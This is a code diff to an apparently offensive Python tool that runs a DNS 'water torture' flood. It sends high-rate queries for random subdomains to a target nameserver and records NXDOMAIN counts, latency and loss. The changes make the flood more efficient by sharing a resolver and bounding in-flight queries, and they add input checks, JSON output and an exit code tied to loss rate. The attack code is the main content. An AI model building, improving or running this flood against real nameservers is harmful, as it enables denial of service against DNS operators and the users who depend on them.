@@ -35,7 +35,12 @@ import random
 import string
 import time
 import uuid
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import (
+    FIRST_COMPLETED,
+    ThreadPoolExecutor,
+    as_completed,
+    wait,
+)
 from dataclasses import asdict, dataclass
 from statistics import mean, quantiles
 
@@ -50,8 +55,10 @@ from mytools.core.utils import (
     add_base_args,
     color,
     create_banner,
+    ensure_output_dir,
     init_scanner,
     print_exploit_info,
+    print_json,
     run_main_loop,
     safe_asyncio_run,
     write_output,
@@ -139,20 +146,15 @@ def _gen_wordlist_label() -> str:
 
 
 def _send_query(
+    resolver: object,
     domain: str,
-    nameserver: str,
-    timeout: float,
 ) -> QueryResult:
     """Envia uma unica query DNS e retorna o resultado."""
     fqdn = f"{domain}"
-    resolver = dns.resolver.Resolver()
-    resolver.nameservers = [nameserver]
-    resolver.timeout = timeout
-    resolver.lifetime = timeout
 
     start = time.monotonic()
     try:
-        resolver.resolve(fqdn, "A")
+        resolver.resolve(fqdn, "A")  # type: ignore[attr-defined]
         latency = (time.monotonic() - start) * 1000
         return QueryResult(
             domain=fqdn,
@@ -227,23 +229,36 @@ def run_water_torture(
     total_queries = rate * duration
     domains = _generate_domains(domain, total_queries, pattern)
 
+    resolver = dns.resolver.Resolver()
+    resolver.nameservers = [nameserver]
+    resolver.timeout = timeout
+    resolver.lifetime = timeout
+
     results: list[QueryResult] = []
     start_time = time.monotonic()
     interval = 1.0 / rate if rate > 0 else 0.01
 
     with ThreadPoolExecutor(max_workers=concurrency) as executor:
-        futures = {}
+        futures: set = set()
+        window = max(concurrency * 4, 8)
         for i, d in enumerate(domains):
-            future = executor.submit(_send_query, d, nameserver, timeout)
-            futures[future] = i
+            future = executor.submit(_send_query, resolver, d)
+            futures.add(future)
 
             if (i + 1) % concurrency == 0:
                 time.sleep(interval * concurrency)
 
+            if len(futures) >= window:
+                done, futures = wait(futures, return_when=FIRST_COMPLETED)
+                for future in done:
+                    try:
+                        results.append(future.result())
+                    except Exception as e:
+                        logger.debug("Query error: %s", e)
+
         for future in as_completed(futures):
             try:
-                result = future.result()
-                results.append(result)
+                results.append(future.result())
             except Exception as e:
                 logger.debug("Query error: %s", e)
 
@@ -419,6 +434,16 @@ async def _async_run_once(args: argparse.Namespace) -> int:
         logger.error("Informe um dominio.")
         return 1
 
+    if args.rate <= 0:
+        logger.error("--rate deve ser > 0 (recebido: %d).", args.rate)
+        return 1
+    if args.duration <= 0:
+        logger.error("--duration deve ser > 0 (recebido: %d).", args.duration)
+        return 1
+    if args.concurrency <= 0:
+        logger.error("--concurrency deve ser > 0 (recebido: %d).", args.concurrency)
+        return 1
+
     if getattr(args, "dry_run", False):
         logger.warning("Nenhuma query DNS sera enviada.")
         logger.info("Dominio: %s", domain)
@@ -443,6 +468,9 @@ async def _async_run_once(args: argparse.Namespace) -> int:
     if not quiet:
         print_results(result)
 
+    if getattr(args, "json_output", False):
+        print_json([asdict(result)])
+
     if args.output:
         write_output(
             args.output,
@@ -465,7 +493,33 @@ async def _async_run_once(args: argparse.Namespace) -> int:
             ],
             quiet=quiet,
         )
-    return 0
+
+    output_dir = getattr(args, "output_dir", None)
+    if output_dir:
+        ensure_output_dir(output_dir)
+        write_output(
+            f"{output_dir}/{domain}.json",
+            [asdict(result)],
+            [
+                "domain",
+                "nameserver",
+                "pattern",
+                "queries_sent",
+                "nxdomain_count",
+                "noerror_count",
+                "other_count",
+                "timeout_count",
+                "avg_latency_ms",
+                "p95_latency_ms",
+                "p99_latency_ms",
+                "loss_rate",
+                "duration_s",
+                "qps",
+            ],
+            quiet=quiet,
+        )
+
+    return 1 if result.loss_rate > 0.1 else 0
 
 
 def run_once(args: argparse.Namespace) -> int:
